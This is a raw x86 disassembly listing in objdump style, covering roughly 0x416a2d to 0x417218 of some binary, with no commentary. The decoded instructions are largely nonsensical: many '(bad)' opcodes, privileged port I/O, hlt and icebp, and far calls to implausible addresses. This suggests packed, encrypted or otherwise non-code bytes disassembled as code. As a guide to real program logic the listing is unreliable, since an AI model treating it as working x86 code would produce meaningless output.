  416a2d:	sbb    edi,edi
  416a2f:	stc    
  416a30:	push   DWORD PTR [eax+0x1e07d0c]
  416a36:	add    eax,0x782dd47e
  416a3b:	out    0xbb,eax
  416a3d:	add    eax,0x9e6f6984
  416a42:	scas   al,BYTE PTR es:[edi]
  416a43:	jb     0x4169e0
  416a45:	std    
  416a46:	cmp    cl,BYTE PTR [ebx+ebp*1+0x63]
  416a4a:	or     eax,0xb269c616
  416a4f:	mov    ah,0x62
  416a51:	sub    BYTE PTR [ebp+ecx*4-0x7078b3de],cl
  416a58:	push   ecx
  416a59:	leave  
  416a5a:	into   
  416a5b:	mov    al,bh
  416a5d:	daa    
  416a5e:	test   DWORD PTR [esi],eax
  416a60:	out    dx,al
  416a61:	cmp    eax,0xf9263e8f
  416a66:	fld    TBYTE PTR [eax+ecx*1]
  416a69:	adc    BYTE PTR [edx],al
  416a6b:	or     eax,0xac7a23af
  416a70:	cmc    
  416a71:	out    dx,eax
  416a72:	adc    eax,0x260bbada
  416a77:	in     al,0x19
  416a79:	ss out dx,al
  416a7b:	cwde   
  416a7c:	ror    esi,1
  416a7e:	icebp  
  416a7f:	hlt    
  416a80:	jne    0x416a24
  416a82:	in     eax,0xe8
  416a84:	(bad)  
  416a85:	cli    
  416a86:	dec    ebp
  416a87:	mov    BYTE PTR [esp+ebp*1-0x564cf86b],al
  416a8e:	(bad)  
  416a8f:	xor    al,ah
  416a91:	lock (bad) 
  416a93:	int    0xb7
  416a95:	std    
  416a96:	jecxz  0x416abe
  416a98:	jmp    0x31590bff
  416a9d:	sbb    dh,0xbc
  416aa0:	mov    ds:0xd3202a4e,eax
  416aa5:	fidivr DWORD PTR [ebx+0x49d432cc]
  416aab:	push   ss
  416aac:	jecxz  0x416ab7
  416aae:	push   ebp
  416aaf:	dec    esi
  416ab0:	xor    BYTE PTR [edi],cl
  416ab2:	stos   BYTE PTR es:[edi],al
  416ab3:	leave  
  416ab4:	mov    ebx,0xf515eb98
  416ab9:	shl    BYTE PTR [ecx],1
  416abb:	dec    edx
  416abc:	xchg   esp,eax
  416abd:	xchg   BYTE PTR ds:0x4b36d156,ch
  416ac3:	add    ecx,DWORD PTR [ebx-0xe]
  416ac6:	inc    BYTE PTR ds:[ecx+0x3e]
  416aca:	xchg   ecx,eax
  416acb:	ja     0x416a84
  416acd:	mov    dl,0xdf
  416acf:	aas    
  416ad0:	in     al,dx
  416ad1:	xlat   BYTE PTR ds:[ebx]
  416ad2:	call   0xf7a2:0xdd809a70
  416ad9:	mov    esi,0x524e0a47
  416ade:	dec    edi
  416adf:	sahf   
  416ae0:	mov    ebx,0x9db3865
  416ae5:	ins    DWORD PTR es:[edi],dx
  416ae6:	adc    DWORD PTR [esi],ecx
  416ae8:	fs mov dl,0x5a
  416aeb:	rcr    BYTE PTR [esi-0xe93cadf],cl
  416af1:	out    0x61,al
  416af3:	iret   
  416af4:	cs pusha 
  416af6:	out    dx,eax
  416af7:	aam    0xe3
  416af9:	leave  
  416afa:	pop    ebp
  416afb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416afc:	jge    0x416b32
  416afe:	cmp    al,0x47
  416b00:	sub    ah,BYTE PTR [eax-0x4210e19f]
  416b06:	ret    0x1251
  416b09:	mov    ebx,DWORD PTR [esi]
  416b0b:	sub    al,0xe4
  416b0d:	popa   
  416b0e:	adc    DWORD PTR [esi+0x64e013eb],0xcb0073ea
  416b18:	call   0x9145:0xf0f8af3e
  416b1f:	dec    ecx
  416b20:	repnz bnd jbe 0x416b71
  416b24:	jae    0x416ad5
  416b26:	mov    eax,ds:0x156c9824
  416b2b:	(bad)  
  416b2c:	jmp    0x5209b07
  416b31:	and    ebx,DWORD PTR [ecx]
  416b33:	cmp    BYTE PTR [ecx-0x5a],al
  416b36:	lahf   
  416b37:	dec    edx
  416b38:	pop    ecx
  416b39:	mov    ?,WORD PTR [ebx-0x1d0723e5]
  416b3f:	popa   
  416b40:	loop   0x416ad3
  416b42:	ret    0x9c6b
  416b45:	mov    dl,0x14
  416b47:	add    eax,0x2cc8b650
  416b4c:	iret   
  416b4d:	test   BYTE PTR [edi],dh
  416b4f:	fst    DWORD PTR [esi+0x573d9015]
  416b55:	leave  
  416b56:	call   0xe8ab038f
  416b5b:	xchg   edx,eax
  416b5c:	loope  0x416b6e
  416b5e:	int    0xf9
  416b60:	dec    eax
  416b61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b62:	(bad)  
  416b64:	jns    0x416b9b
  416b66:	and    ebx,esi
  416b68:	shl    BYTE PTR [ebx+eax*8],0x93
  416b6c:	dec    edx
  416b6d:	cli    
  416b6e:	repz and eax,esp
  416b71:	inc    esi
  416b72:	or     al,BYTE PTR [edx+0x48c3d408]
  416b78:	jbe    0x416b90
  416b7a:	mov    bh,0xa3
  416b7c:	mov    ah,0x8c
  416b7e:	cmp    BYTE PTR [edx+0x3a93b94e],cl
  416b84:	mov    dl,0x90
  416b86:	or     edx,edi
  416b88:	inc    esi
  416b89:	ret    0x8a75
  416b8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b8d:	repnz xchg edx,eax
  416b8f:	mov    WORD PTR [eax-0x5a],ds
  416b92:	retf   0x9160
  416b95:	(bad)  
  416b97:	popa   
  416b98:	or     eax,0xeff59cb7
  416b9d:	cmp    BYTE PTR [eax+0x48903885],bh
  416ba3:	fisub  DWORD PTR [ebx+0x63]
  416ba6:	rol    DWORD PTR [edx-0x6d],1
  416ba9:	or     ecx,esi
  416bab:	fimul  DWORD PTR [ebx]
  416bad:	lods   al,BYTE PTR ds:[esi]
  416bae:	(bad)  
  416baf:	xlat   BYTE PTR ds:[ebx]
  416bb0:	mov    gs:0x74454d5f,al
  416bb6:	call   0xb977b059
  416bbb:	mov    bl,0x3f
  416bbd:	fcmovb st,st(1)
  416bbf:	scas   al,BYTE PTR es:[edi]
  416bc0:	sub    DWORD PTR [edi-0x64],edi
  416bc3:	daa    
  416bc4:	mul    BYTE PTR [edx]
  416bc6:	and    dl,BYTE PTR [ebx]
  416bc8:	or     eax,0xe8fa6b24
  416bcd:	push   esp
  416bce:	jno    0x416b60
  416bd0:	and    eax,0xefc2f6bf
  416bd5:	xor    DWORD PTR [edi],esi
  416bd7:	(bad)  
  416bd8:	in     al,0x60
  416bda:	ret    0x920
  416bdd:	imul   ecx,edi,0xffffffa3
  416be0:	mov    ebp,0xaaa4efbc
  416be5:	aad    0xc6
  416be7:	dec    ecx
  416be8:	jge    0x416b88
  416bea:	mov    dl,0x20
  416bec:	mov    edi,eax
  416bee:	(bad)  
  416bf0:	rcl    eax,0xe7
  416bf3:	(bad)  
  416bf5:	xchg   esp,eax
  416bf6:	pop    ebx
  416bf7:	aam    0x84
  416bf9:	fst    st(2)
  416bfb:	adc    bh,bh
  416bfd:	fwait
  416bfe:	jp     0x416c64
  416c00:	cwde   
  416c01:	push   ecx
  416c02:	add    DWORD PTR ds:0x85b54284,edi
  416c08:	pop    ebx
  416c09:	push   edx
  416c0a:	es mov edx,0xd29dee4d
  416c10:	adc    cl,ch
  416c12:	xchg   edx,eax
  416c13:	outs   dx,BYTE PTR ds:[esi]
  416c14:	nop
  416c15:	add    DWORD PTR [edx],edx
  416c17:	out    0x5,al
  416c19:	add    ah,bh
  416c1b:	pop    esp
  416c1c:	(bad)  
  416c1d:	jbe    0x416bcb
  416c1f:	or     dl,BYTE PTR [edx+0x10]
  416c22:	fs mov bl,0x3
  416c25:	push   ds
  416c26:	fiadd  WORD PTR [ebx+0x7e]
  416c29:	xchg   ecx,eax
  416c2a:	ds or  eax,0xda5d8a59
  416c30:	mov    al,ds:0x9b647fc8
  416c35:	mov    ah,0x58
  416c37:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  416c39:	(bad)  [ebx]
  416c3b:	or     al,0x7c
  416c3d:	push   ecx
  416c3e:	(bad)  
  416c3f:	hlt    
  416c40:	dec    edx
  416c41:	nop
  416c42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c43:	xchg   ebp,eax
  416c44:	inc    eax
  416c45:	arpl   WORD PTR [esi-0x35],bp
  416c48:	or     BYTE PTR [si-0x7d],ah
  416c4c:	(bad)  
  416c4d:	mov    esi,0xaccee8e9
  416c52:	aaa    
  416c53:	push   0xffffff90
  416c55:	sbb    dl,BYTE PTR [ebx+0x7b2ccc3a]
  416c5b:	jns    0x416cc0
  416c5d:	pop    ebp
  416c5e:	jo     0x416c4b
  416c60:	pop    ss
  416c61:	mov    ebx,0x30557559
  416c66:	add    dl,BYTE PTR [edx]
  416c68:	adc    BYTE PTR [esi+0x46],ah
  416c6b:	xchg   esi,eax
  416c6c:	or     DWORD PTR [eax-0x77],eax
  416c6f:	pop    ds
  416c70:	out    dx,al
  416c71:	inc    BYTE PTR [esi+0x7ef937a2]
  416c77:	test   DWORD PTR [esp+ecx*2+0x7c2034c4],esp
  416c7e:	xchg   ecx,eax
  416c7f:	test   cl,ah
  416c81:	and    eax,0x890c3343
  416c86:	cld    
  416c87:	div    DWORD PTR [eax+0x1c165cbd]
  416c8d:	iret   
  416c8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c8f:	mov    al,0x53
  416c91:	cdq    
  416c92:	popa   
  416c93:	add    BYTE PTR [esp+ebp*4+0x499365e6],ah
  416c9a:	xchg   edi,eax
  416c9b:	push   ds
  416c9c:	jne    0x416cf1
  416c9e:	sub    esp,ecx
  416ca0:	xchg   ebx,eax
  416ca1:	hlt    
  416ca2:	jmp    DWORD PTR [eax+0x55a29cb3]
  416ca8:	stos   DWORD PTR es:[edi],eax
  416ca9:	and    al,0x61
  416cab:	in     eax,0x1a
  416cad:	add    bl,bl
  416caf:	call   0x53251f63
  416cb4:	outs   dx,DWORD PTR ds:[esi]
  416cb5:	add    al,cl
  416cb7:	(bad)  
  416cb8:	cmp    eax,0x89e8a6c3
  416cbd:	out    0x30,eax
  416cbf:	cs ret 
  416cc1:	sub    ch,BYTE PTR [ebx+0x50]
  416cc4:	cmp    bl,ah
  416cc6:	fisubr DWORD PTR [esi]
  416cc8:	add    BYTE PTR [eax-0x57e04b57],dh
  416cce:	leave  
  416ccf:	ss dec edi
  416cd1:	cmc    
  416cd2:	mov    DWORD PTR [ebp-0x7d],0x4540611e
  416cd9:	scas   al,BYTE PTR es:[edi]
  416cda:	fdivr  DWORD PTR [edx-0x12]
  416cdd:	jge    0x416ccd
  416cdf:	std    
  416ce0:	jb     0x416ca0
  416ce2:	or     eax,0xde2e9abb
  416ce7:	mov    eax,ds:0x2456f055
  416cec:	add    bh,0xf1
  416cef:	pop    edi
  416cf0:	aam    0xc
  416cf2:	rol    eax,1
  416cf4:	(bad)  
  416cf5:	aam    0xaa
  416cf7:	inc    ebp
  416cf8:	dec    ebp
  416cf9:	ror    DWORD PTR [ebp+0x1a],1
  416cfc:	loopne 0x416d58
  416cfe:	mov    esp,0x2fc42c34
  416d03:	cmc    
  416d04:	lods   eax,DWORD PTR ds:[esi]
  416d05:	sub    al,0x19
  416d07:	sbb    eax,0x3d00d10e
  416d0c:	mov    edi,esi
  416d0e:	xor    ebx,DWORD PTR [edx]
  416d10:	jle    0x416d7c
  416d12:	nop
  416d13:	push   ebx
  416d14:	imul   ebx,DWORD PTR [ebx],0x7c
  416d17:	scas   eax,DWORD PTR es:[edi]
  416d18:	icebp  
  416d19:	stos   DWORD PTR es:[edi],eax
  416d1a:	sbb    ah,bl
  416d1c:	add    al,0x42
  416d1e:	sbb    al,0x29
  416d20:	shl    DWORD PTR [ebp-0x6d8ac254],1
  416d26:	(bad)  
  416d27:	dec    esp
  416d28:	xor    eax,0x87333a52
  416d2d:	jno    0x416cc7
  416d2f:	mov    WORD PTR [edi+0x3d],ss
  416d32:	dec    ecx
  416d33:	lahf   
  416d34:	mov    ch,0xba
  416d36:	retf   
  416d37:	(bad)  
  416d38:	cmp    BYTE PTR [ebp+0x2d10af5f],cl
  416d3e:	cwde   
  416d3f:	dec    eax
  416d40:	aad    0x44
  416d42:	add    al,0x9c
  416d44:	inc    edi
  416d45:	sub    DWORD PTR [ebp+0x11f2dd5a],eax
  416d4b:	(bad)  
  416d4c:	mov    dl,0xd
  416d4e:	aad    0x82
  416d50:	and    al,0xe4
  416d52:	imul   esp,DWORD PTR [ecx+0x7578dd4b],0xba674744
  416d5c:	cmc    
  416d5d:	test   BYTE PTR [eax+ecx*1+0x60],bh
  416d61:	fwait
  416d62:	out    dx,al
  416d63:	push   esi
  416d64:	ss adc ebx,eax
  416d67:	push   0x5d
  416d69:	ficomp DWORD PTR [edi-0x48]
  416d6c:	inc    esp
  416d6d:	test   DWORD PTR [eax+ebx*2-0x27],eax
  416d71:	lock push cs
  416d73:	lods   eax,DWORD PTR ds:[esi]
  416d74:	pop    es
  416d75:	leave  
  416d76:	mov    bl,0xca
  416d78:	sub    eax,0x4a10e018
  416d7d:	jno    0x416d15
  416d7f:	aad    0xc1
  416d81:	jmp    0xaf0f:0xc40f5612
  416d88:	in     eax,dx
  416d89:	scas   eax,DWORD PTR es:[edi]
  416d8a:	aaa    
  416d8b:	jbe    0x416d87
  416d8d:	and    eax,0x58c5fd9d
  416d92:	mov    eax,0xd18673d2
  416d97:	jmp    0x6aec476b
  416d9c:	out    dx,eax
  416d9d:	aaa    
  416d9e:	loopne 0x416d79
  416da0:	or     dh,BYTE PTR [ecx-0x26]
  416da3:	loop   0x416d56
  416da5:	dec    edi
  416da6:	(bad)  [edi-0x2f6059ea]
  416dac:	push   edi
  416dad:	jno    0x416e16
  416daf:	retf   0x7b3b
  416db2:	sub    DWORD PTR [ebx-0x12],eax
  416db5:	aaa    
  416db6:	inc    ebx
  416db7:	(bad)  
  416db8:	mov    al,ds:0xe72d246b
  416dbd:	pop    ss
  416dbe:	jbe    0x416e39
  416dc0:	push   ebp
  416dc1:	imul   ecx,DWORD PTR es:[esi-0x5c],0xe
  416dc6:	and    BYTE PTR [edx+esi*4],0x3e
  416dca:	shl    DWORD PTR [esi+0x32],1
  416dcd:	jmp    0xca70:0x3abfcc92
  416dd4:	inc    ecx
  416dd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dd6:	dec    edx
  416dd7:	sbb    esi,DWORD PTR [ecx]
  416dd9:	push   eax
  416dda:	jae    0x416e22
  416ddc:	ja     0x416d65
  416dde:	adc    esp,ebx
  416de0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416de1:	push   0x66b3d33d
  416de6:	rcl    DWORD PTR [edx+ebx*1-0x5],1
  416dea:	out    dx,eax
  416deb:	out    0x2,al
  416ded:	aaa    
  416dee:	add    DWORD PTR cs:[ebx+0x6d4567bc],eax
  416df5:	jno    0x416e71
  416df7:	mov    ?,WORD PTR [ebp+ebx*2+0x39]
  416dfb:	fs pop edx
  416dfd:	dec    ebx
  416dfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dff:	dec    ebp
  416e00:	cmp    eax,0x622409e
  416e05:	push   0x388fb919
  416e0a:	mov    eax,0x9bd325be
  416e0f:	xchg   DWORD PTR [edx-0x33],eax
  416e12:	dec    ebx
  416e13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e14:	ficomp WORD PTR [eax-0x184142b9]
  416e1a:	pusha  
  416e1b:	dec    ecx
  416e1c:	push   ebx
  416e1d:	in     eax,0xf9
  416e1f:	xlat   BYTE PTR ds:[ebx]
  416e20:	pop    ebp
  416e21:	sbb    eax,0x3c20ce47
  416e26:	sahf   
  416e27:	xor    eax,0x2e073dfe
  416e2c:	fs adc eax,0x96e8de75
  416e32:	jg     0x416e90
  416e34:	mov    ebx,0x74526614
  416e39:	xchg   edx,eax
  416e3a:	das    
  416e3b:	or     ecx,ecx
  416e3d:	retf   0xf237
  416e40:	cmp    eax,0xe0289793
  416e45:	mov    bl,0xfc
  416e47:	push   esp
  416e48:	mov    ebx,0xf0a0f5a
  416e4d:	xchg   ecx,esi
  416e4f:	adc    eax,esp
  416e51:	sti    
  416e52:	xor    eax,0xf812926c
  416e57:	push   ecx
  416e58:	les    esi,FWORD PTR [edi+0x13]
  416e5b:	es xchg esi,eax
  416e5d:	pmaxub mm6,QWORD PTR [edx+edi*8]
  416e61:	test   eax,0xae07f201
  416e66:	pop    edi
  416e67:	mov    ds:0x5510a470,al
  416e6c:	sti    
  416e6d:	adc    al,BYTE PTR [ecx]
  416e6f:	inc    edi
  416e70:	out    0xb5,al
  416e72:	cdq    
  416e73:	out    0x9f,al
  416e75:	(bad)  
  416e76:	mov    dl,0x14
  416e78:	mov    ds:0x47642784,eax
  416e7d:	and    edx,DWORD PTR [ecx]
  416e7f:	add    al,ch
  416e81:	fstp   DWORD PTR [eax+0x266d71e8]
  416e87:	out    0xa1,eax
  416e89:	ror    DWORD PTR [eax-0x1c],0x4
  416e8d:	ror    BYTE PTR [ecx-0x391c3b34],cl
  416e93:	int3   
  416e94:	hlt    
  416e95:	test   eax,0xadf658c1
  416e9a:	add    eax,0x63385d96
  416e9f:	in     al,dx
  416ea0:	(bad)  
  416ea1:	mov    DWORD PTR [ebp+0x3e],ebp
  416ea4:	or     eax,0x7d14b060
  416ea9:	lods   al,BYTE PTR ds:[esi]
  416eaa:	xchg   DWORD PTR [ebx+0x1],ebp
  416ead:	cmp    eax,0x4d262308
  416eb2:	gs (bad) 
  416eb4:	int3   
  416eb5:	sbb    ebx,DWORD PTR [esp+esi*4+0x1074b7e3]
  416ebc:	push   ecx
  416ebd:	dec    eax
  416ebe:	pushf  
  416ebf:	mov    ds:0x6b4592ff,al
  416ec4:	icebp  
  416ec5:	adc    al,0x43
  416ec7:	push   ecx
  416ec8:	dec    esp
  416ec9:	xchg   cl,cl
  416ecb:	aam    0xc0
  416ecd:	mov    bl,0x16
  416ecf:	inc    ebp
  416ed0:	cs add eax,0x6d427319
  416ed6:	sbb    eax,DWORD PTR [edi+0x827f6b4]
  416edc:	pop    edx
  416edd:	push   ds
  416ede:	lods   al,BYTE PTR ds:[esi]
  416edf:	into   
  416ee0:	mov    esi,0xe28acf85
  416ee5:	call   0x9214:0xdf2b6c69
  416eec:	add    dh,dl
  416eee:	and    eax,0x1023c812
  416ef3:	dec    ebx
  416ef4:	push   0x56dfa119
  416ef9:	fmul   st,st(4)
  416efb:	cmp    eax,0xeb9a6ae4
  416f00:	mov    bl,0x5f
  416f02:	fisttp WORD PTR [edx-0x77efda3a]
  416f08:	hlt    
  416f09:	xchg   esi,eax
  416f0a:	jbe    0x416ef3
  416f0c:	test   eax,0x677e26b8
  416f11:	imul   esp,ecx,0xd9141fff
  416f17:	test   eax,0x88521683
  416f1c:	or     BYTE PTR [esi-0x7d],0xb0
  416f20:	retf   
  416f21:	dec    eax
  416f22:	sub    edi,DWORD PTR [edx-0x35]
  416f25:	cs test eax,0xb80b107e
  416f2b:	imul   BYTE PTR [edx+0x107067df]
  416f31:	test   eax,0x1ba797c6
  416f36:	shr    al,cl
  416f38:	repnz mov ds,WORD PTR [edx-0xc27e487]
  416f3f:	loope  0x416f6c
  416f41:	mov    bh,0x87
  416f43:	add    esi,DWORD PTR [edi]
  416f45:	ins    DWORD PTR es:[edi],dx
  416f46:	dec    esp
  416f47:	imul   esi,edi,0x441da054
  416f4d:	inc    ebp
  416f4e:	dec    esp
  416f4f:	cli    
  416f50:	push   edi
  416f51:	in     eax,dx
  416f52:	jb     0x416fbb
  416f54:	cld    
  416f55:	sbb    BYTE PTR [edx-0x8b3bb91],dh
  416f5b:	daa    
  416f5c:	daa    
  416f5d:	adc    ah,BYTE PTR [esi+0x3f8247dc]
  416f63:	jp     0x416f72
  416f65:	pop    ebp
  416f66:	loop   0x416f65
  416f68:	mov    dh,0x1c
  416f6a:	enter  0xfb3a,0xcc
  416f6e:	(bad)  
  416f6f:	xlat   BYTE PTR ds:[ebx]
  416f70:	ja     0x416f22
  416f72:	sbb    eax,0xf2e8ca0c
  416f77:	(bad)  
  416f78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f79:	xchg   DWORD PTR [edi+0x46],edi
  416f7c:	and    eax,0x7b25
  416f81:	cmp    ch,dh
  416f83:	test   DWORD PTR [ebx],ecx
  416f85:	xor    BYTE PTR [ebp-0x1a],bl
  416f88:	call   0x8493:0x739b3935
  416f8f:	cmp    ecx,edi
  416f91:	cld    
  416f92:	xor    DWORD PTR [eax-0x1dc917aa],ecx
  416f98:	or     ah,BYTE PTR [eax]
  416f9a:	in     al,dx
  416f9b:	scas   eax,DWORD PTR es:[edi]
  416f9c:	nop
  416f9d:	lea    ebx,[esi+0x3ec8f44c]
  416fa3:	(bad)  
  416fa4:	(bad)  
  416fa5:	enter  0x25c4,0x68
  416fa9:	jbe    0x416fed
  416fab:	xor    DWORD PTR [ecx+0x7f4b75b5],ebx
  416fb1:	rcr    DWORD PTR ss:[ebx+0x45],0x74
  416fb6:	mov    ebp,0xa6b9024d
  416fbb:	xchg   esp,eax
  416fbc:	nop
  416fbd:	imul   esp,DWORD PTR [edx-0x28],0x56
  416fc1:	das    
  416fc2:	sar    DWORD PTR [edi],0x2a
  416fc5:	jno    0x416f73
  416fc7:	out    dx,eax
  416fc8:	sub    DWORD PTR [eax+0x4c],edx
  416fcb:	js     0x417032
  416fcd:	gs leave 
  416fcf:	push   edi
  416fd0:	and    ebx,DWORD PTR [ebx+0x2c]
  416fd3:	fmul   st(2),st
  416fd5:	and    DWORD PTR [edx+0x4f362dde],edi
  416fdb:	jl     0x416fb0
  416fdd:	mov    dl,0xcc
  416fdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fe0:	rcr    BYTE PTR [ecx],1
  416fe2:	push   ebp
  416fe3:	test   bh,bh
  416fe5:	and    edx,DWORD PTR [edi-0x162109ad]
  416feb:	xor    cl,al
  416fed:	sub    edi,DWORD PTR [edi]
  416fef:	mov    eax,ds:0xc857e76f
  416ff4:	jecxz  0x417039
  416ff6:	lods   eax,DWORD PTR ds:[esi]
  416ff7:	fadd   QWORD PTR [eax-0x5bbaa979]
  416ffd:	sub    dh,bh
  416fff:	scas   al,BYTE PTR es:[edi]
  417000:	in     al,dx
  417001:	push   esi
  417002:	mov    ch,0x9b
  417004:	xor    al,0xc2
  417006:	jno    0x417022
  417008:	cmp    esp,ecx
  41700a:	gs clc 
  41700c:	into   
  41700d:	and    BYTE PTR [eax],ah
  41700f:	push   esp
  417010:	sbb    bh,cl
  417012:	loop   0x417074
  417014:	repz pop ebp
  417016:	add    al,0xec
  417018:	in     al,0x20
  41701a:	mov    fs,WORD PTR [edi]
  41701c:	ret    
  41701d:	(bad)  
  41701e:	mov    bl,0x5e
  417020:	ds clc 
  417022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417023:	inc    esi
  417024:	jo     0x4170a3
  417026:	test   ebp,esi
  417028:	clc    
  417029:	pop    es
  41702a:	and    dh,BYTE PTR [edx]
  41702c:	hlt    
  41702d:	shl    BYTE PTR [edi-0x1d316956],0x5b
  417034:	push   0xb0847967
  417039:	loope  0x416fe9
  41703b:	mov    ch,BYTE PTR [esi]
  41703d:	jae    0x41701f
  41703f:	adc    DWORD PTR [edx+0x28434f14],esi
  417045:	les    ecx,FWORD PTR [edi-0x712d2e95]
  41704b:	jae    0x417071
  41704d:	and    dl,BYTE PTR [ebp-0x1043d5e7]
  417053:	pusha  
  417054:	or     ebp,eax
  417056:	data16 xor WORD PTR [edi+0x4c],0x6b8a
  41705d:	or     ecx,edx
  41705f:	arpl   WORD PTR [esi+0x54e56163],cx
  417065:	shl    BYTE PTR [edx+0x60],0x93
  417069:	lds    ecx,FWORD PTR [ecx+0x779c9daa]
  41706f:	or     cl,BYTE PTR [edi]
  417071:	jbe    0x41707f
  417073:	cmp    eax,0xb8179707
  417078:	rcr    edx,0xae
  41707b:	dec    ecx
  41707c:	xchg   esi,eax
  41707d:	js     0x41708c
  41707f:	push   0x642fc8fd
  417084:	xchg   BYTE PTR [edi+0x5ebeb1c5],ch
  41708a:	push   esp
  41708b:	mul    BYTE PTR [edi-0x55]
  41708e:	and    BYTE PTR [edx-0x3c],ah
  417091:	pop    ss
  417092:	sub    DWORD PTR [ebx+0x35],0x7bea4be7
  417099:	and    DWORD PTR [esi+ebp*2],edx
  41709c:	push   edi
  41709d:	dec    ebx
  41709e:	push   esp
  41709f:	add    ebp,esp
  4170a1:	ret    0x8725
  4170a4:	(bad)  
  4170a5:	pop    esp
  4170a6:	add    DWORD PTR [edx-0x45],ebx
  4170a9:	cmp    ebp,DWORD PTR [edi]
  4170ab:	ficom  WORD PTR [ebx+0x58a0ad86]
  4170b1:	loope  0x417068
  4170b3:	sar    BYTE PTR es:[esi],0x3
  4170b7:	sbb    dh,BYTE PTR [eax+ebx*1]
  4170ba:	and    al,0x1b
  4170bc:	xchg   ebx,eax
  4170bd:	lea    esp,[eax+0xa1bfca4]
  4170c3:	adc    al,0xd5
  4170c5:	push   ebp
  4170c6:	les    edi,FWORD PTR [edx-0x5711c15d]
  4170cc:	int    0xa7
  4170ce:	pop    edi
  4170cf:	in     eax,dx
  4170d0:	xor    DWORD PTR [edi+0x32],edx
  4170d3:	jne    0x41705c
  4170d5:	cmp    eax,0x7853f3cd
  4170da:	mov    dl,BYTE PTR [esi+esi*8-0x65]
  4170de:	popa   
  4170df:	push   esp
  4170e0:	inc    esi
  4170e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170e2:	cld    
  4170e3:	mov    dh,0x75
  4170e5:	fwait
  4170e6:	leave  
  4170e7:	pop    ecx
  4170e8:	sub    edi,DWORD PTR [eax+0x1794533f]
  4170ee:	or     BYTE PTR [eax],bh
  4170f0:	cmp    eax,ebp
  4170f2:	push   edi
  4170f3:	fist   DWORD PTR [ebx-0x67]
  4170f6:	adc    DWORD PTR [edi+0x32],esi
  4170f9:	or     dh,BYTE PTR [edi-0x3c1fadb3]
  4170ff:	push   bp
  417101:	div    BYTE PTR [esi+edi*8-0x78]
  417105:	ret    
  417106:	int3   
  417107:	inc    eax
  417108:	inc    edi
  417109:	fstp   DWORD PTR [ebx]
  41710b:	jno    0x41712a
  41710d:	nop
  41710e:	dec    esi
  41710f:	xor    BYTE PTR [edi],cl
  417111:	repnz lahf 
  417113:	cmp    BYTE PTR [ecx-0x75],0xee
  417117:	sbb    esp,edx
  417119:	imul   edi,edx,0x17ec1c2f
  41711f:	pop    ecx
  417120:	dec    eax
  417121:	test   al,0xeb
  417123:	enter  0x154c,0xa0
  417127:	fbstp  TBYTE PTR [ebx]
  417129:	arpl   WORD PTR [eax-0x75447fe5],bp
  41712f:	jnp    0x417177
  417131:	pop    esp
  417132:	into   
  417133:	mov    edi,0x226dc647
  417138:	dec    edi
  417139:	enter  0xadf6,0xe1
  41713d:	mov    ah,0x77
  41713f:	aam    0x7c
  417141:	mov    ch,0xd0
  417143:	mov    ds:0x4c5c80b3,al
  417148:	imul   esi,edx,0xa32d3540
  41714e:	mov    ebp,0x214dc1bd
  417153:	shl    BYTE PTR [esi-0x141377b0],cl
  417159:	lock (bad) 
  41715c:	mov    al,0x7b
  41715e:	push   0xffffffcd
  417160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417161:	cmp    dh,BYTE PTR [ecx-0x6886526b]
  417167:	fdivr  DWORD PTR [ebp+0x1c2e62ce]
  41716d:	icebp  
  41716e:	call   0xec3b:0xfd82f657
  417175:	ficomp WORD PTR [ecx-0x36]
  417178:	jnp    0x41715d
  41717a:	push   0xa8ee8443
  41717f:	jbe    0x4171b7
  417181:	icebp  
  417182:	nop
  417183:	pushf  
  417184:	xor    DWORD PTR [eax],eax
  417186:	push   cs
  417187:	leave  
  417188:	retf   0xdbe5
  41718b:	xor    BYTE PTR [eax],dl
  41718d:	jl     0x41711d
  41718f:	cmp    BYTE PTR [ebp+0x4f6a96cc],al
  417195:	ds mov esp,0xc8646381
  41719b:	mov    ah,0xd9
  41719d:	(bad)  
  41719e:	rcr    esp,cl
  4171a0:	and    DWORD PTR [ebx+0x56266315],edx
  4171a6:	xor    eax,0xfd1666c3
  4171ab:	imul   esp,DWORD PTR [ebx+edx*2],0xffffff83
  4171af:	js     0x417210
  4171b1:	sbb    BYTE PTR [ebx+ecx*2-0x29ae5973],ch
  4171b8:	dec    BYTE PTR [edx]
  4171ba:	mov    ebp,edx
  4171bc:	jl     0x417204
  4171be:	mov    eax,0xab8ed8fb
  4171c3:	xor    edx,esp
  4171c5:	test   BYTE PTR [edx+eiz*8],dh
  4171c8:	fisub  WORD PTR [edx]
  4171ca:	imul   eax,DWORD PTR [ecx-0x65b96af],0x79
  4171d1:	scas   al,BYTE PTR es:[edi]
  4171d2:	mov    dl,dl
  4171d4:	mov    bh,0x1f
  4171d6:	mov    edx,DWORD PTR [esi-0x6a66ffe9]
  4171dc:	dec    ebx
  4171dd:	outs   dx,BYTE PTR ds:[esi]
  4171de:	adc    eax,0x18fb7e6f
  4171e3:	loopne 0x417207
  4171e5:	fcomp  DWORD PTR [ebx]
  4171e7:	adc    eax,0x2ddff87f
  4171ec:	popa   
  4171ed:	mov    eax,0x6b530d71
  4171f2:	mov    ds:0x8c5975d7,al
  4171f7:	leave  
  4171f8:	lea    edi,[edx+0x57599ee4]
  4171fe:	add    eax,0x11debffd
  417203:	or     al,0x60
  417205:	mov    al,0x5
  417207:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417208:	fmul   QWORD PTR [ebx+0x3b672584]
  41720e:	xor    al,0x6b
  417210:	mov    dh,0x21
  417212:	outs   dx,DWORD PTR ds:[esi]
  417213:	inc    eax
  417214:	inc    ebp
  417215:	push   eax
  417216:	mov    bh,BYTE PTR [edi]
  417218:	xchg   esp,eax
